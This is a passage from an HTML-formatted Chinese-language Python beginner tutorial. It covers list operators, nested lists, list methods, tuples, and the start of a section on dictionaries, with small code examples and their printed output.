punctuation">(</span>list5<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 5, 'test'][1, 3, 5, 'test', 'restart'][1, 3, 'test', 'restart']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list6<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list6<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 列表长度</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 组合</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 重复</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 存在与否</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># 迭代</span>    <span class="token triple-quoted-string string">'''[1, 2, 3, 'test']4[1, 2, 3, 4, 5, 6]['test', 'test', 'test', 'test']True1 2 3 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="镶嵌列表"><a href="#镶嵌列表" class="headerlink" title="镶嵌列表"></a>镶嵌列表</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 镶嵌列表</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> n<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[['a', 'b', 'c'], [1, 2, 3]]['a', 'b', 'c']b'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><table><thead><tr><th align="left">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> 列表元素个数</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> 返回列表元素最大值</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> 返回列表元素最小值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><table><thead><tr><th align="left">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td align="left">6</td><td align="left">[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> 反向列表中元素</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> 清空列表</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> 复制列表</td></tr></tbody></table><h3 id="函数示例-2"><a href="#函数示例-2" class="headerlink" title="函数示例"></a>函数示例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个 0-4 的列表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span>list1<span class="token punctuation">,</span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list1 最大元素值 : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list1 最大元素值 :  Taobao</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 最大元素值 : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list2 最大元素值 :  700</span>list1<span class="token punctuation">,</span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list1 最小元素值 : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list1 最小元素值 :  Google</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 最小元素值 : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list2 最小元素值 :  200</span>aTuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>aTuple<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表元素 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表元素 :  [123, 'Google', 'Runoob', 'Taobao']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Hello World"</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表元素 : "</span><span class="token punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># 列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"更新后的列表 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 更新后的列表 :  ['Google', 'Runoob', 'Taobao', 'Baidu']</span>aList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"123 元素个数 : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 123 元素个数 :  2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Runoob 元素个数 : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob 元素个数 :  1</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 创建 0-4 的列表</span>list1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>list2<span class="token punctuation">)</span>  <span class="token comment"># 扩展列表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"扩展后的列表："</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 扩展后的列表： ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob 索引值为'</span><span class="token punctuation">,</span> list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob 索引值为 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Taobao 索引值为'</span><span class="token punctuation">,</span> list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'Taobao'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Taobao 索引值为 2</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'列表插入元素后为 : '</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表插入元素后为 :  ['Google', 'Baidu', 'Runoob', 'Taobao']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表现在为 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表现在为 :  ['Google', 'Runoob']</span>list1<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表现在为 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表现在为 :  ['Google']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'Taobao'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表现在为 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表现在为 :  ['Google', 'Runoob', 'Baidu']</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表现在为 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表现在为 :  ['Google', 'Runoob']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表反转后: "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表反转后:  ['Baidu', 'Taobao', 'Runoob', 'Google']</span>aList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Facebook'</span><span class="token punctuation">]</span>aList<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"List : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">)</span><span class="token comment"># List :  ['Facebook', 'Google', 'Runoob', 'Taobao']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列表清空后 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 列表清空后 :  []</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> list1<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 列表: "</span><span class="token punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># list2 列表:  ['Google', 'Runoob', 'Taobao', 'Baidu']</span><span class="token triple-quoted-string string">'''35list1 最大元素值 :  Taobaolist2 最大元素值 :  700list1 最小元素值 :  Googlelist2 最小元素值 :  200列表元素 :  [123, 'Google', 'Runoob', 'Taobao']列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']更新后的列表 :  ['Google', 'Runoob', 'Taobao', 'Baidu']123 元素个数 :  2Runoob 元素个数 :  1扩展后的列表： ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]Runoob 索引值为 1Taobao 索引值为 2列表插入元素后为 :  ['Google', 'Baidu', 'Runoob', 'Taobao']列表现在为 :  ['Google', 'Runoob']列表现在为 :  ['Google']列表现在为 :  ['Google', 'Runoob', 'Baidu']列表现在为 :  ['Google', 'Runoob']列表反转后:  ['Baidu', 'Taobao', 'Runoob', 'Google']List :  ['Facebook', 'Google', 'Runoob', 'Taobao']列表清空后 :  []list2 列表:  ['Google', 'Runoob', 'Taobao', 'Baidu']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><ol><li>元组元素不能更改</li><li>元组写在小括号内，以<code>,</code>分隔</li><li>各元素类型可以不同</li><li>元组的索引切片操作与string一样</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'dou'</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test2'</span><span class="token punctuation">)</span>tuple3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span>  <span class="token comment"># 单个元素后面加逗号</span>tuple4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 空元组</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple4<span class="token punctuation">)</span><span class="token comment"># ()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple3<span class="token punctuation">)</span><span class="token comment"># (1,)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第一个元素</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第二个到第三个元素</span><span class="token comment"># (1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有元素</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有元素</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第三个及前面的所有</span><span class="token comment"># (1, 1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">+</span> tuple2<span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 'test2')</span><span class="token triple-quoted-string string">'''()(1, 1.2, 'test', 'dou')(1,)1(1.2, 'test')(1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou')(1, 1.2, 'test')(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou', 1, 'test2')'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运算符-2"><a href="#运算符-2" class="headerlink" title="运算符"></a>运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">tuple6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple6<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tuple6<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 列表长度</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 组合</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 重复</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 存在与否</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token comment"># 迭代</span><span class="token triple-quoted-string string">'''(1, 2, 3, 'test')4(1, 2, 3, 4, 5, 6)('test', 'test', 'test', 'test')True1 2 3 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(tuple) 计算元组元素个数。</td><td align="left"><code>&gt;&gt;&gt; tuple1 = ('Google', 'Runoob', 'Taobao') </code><br><code>&gt;&gt;&gt; len(tuple1) 3 </code></td></tr><tr><td align="left">2</td><td align="left">max(tuple) 返回元组中元素最大值。</td><td align="left"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; max(tuple2) '8'</code></td></tr><tr><td align="left">3</td><td align="left">min(tuple) 返回元组中元素最小值。</td><td align="left"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; min(tuple2) '4' </code></td></tr><tr><td align="left">4</td><td align="left">tuple(iterable) 将可迭代系列转换为元组。</td><td align="left"><code>&gt;&gt;&gt; list1= ['Google', 'Taobao', 'Runoob', 'Baidu'] </code><br><code>&gt;&gt;&gt; tuple1=tuple(list1) </code><br><code>&gt;&gt;&gt; tuple1 ('Google', 'Taobao', 'Runoob', 'Baidu')</code></td></tr></tbody></table><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><ol><li>字典是无序的，依靠键值对来存取</li><li>字典用<code>{}</code>标识， <code>键(key) : 值(value)</code></li><li><code>key</code>不可变，并且是唯一的</li><li>使用<code>{}</code>创建空字典</li><li>键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 空字典</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span 